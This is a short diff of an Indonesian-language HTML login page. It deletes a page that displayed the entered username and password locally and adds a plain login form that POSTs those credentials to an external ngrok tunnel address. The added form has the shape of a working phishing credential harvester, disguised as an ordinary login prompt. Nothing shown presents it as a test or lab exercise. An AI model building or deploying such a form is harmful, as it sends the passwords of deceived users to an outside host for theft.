@@ -1,26 +1,5 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login email</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <div class="container">
-    <h2>Login Kamera</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit">Login</button>
-    </form>
-    <div id="result" class="hidden">
-      <h3>Hasil Login:</h3>
-      <p><strong>Username:</strong> <span id="hasilUser"></span></p>
-      <p><strong>Password:</strong> <span id="hasilPass"></span></p>
-    </div>
-  </div>
-
-  <script src="script.js"></script>
-</body>
-</html>
+<form method="POST" action="https://1a2b3c4d5e.ngrok.io/login">
+  <input type="text" name="username" placeholder="Username"><br>
+  <input type="password" name="password" placeholder="Password"><br>
+  <button type="submit">Login</button>
+</form>
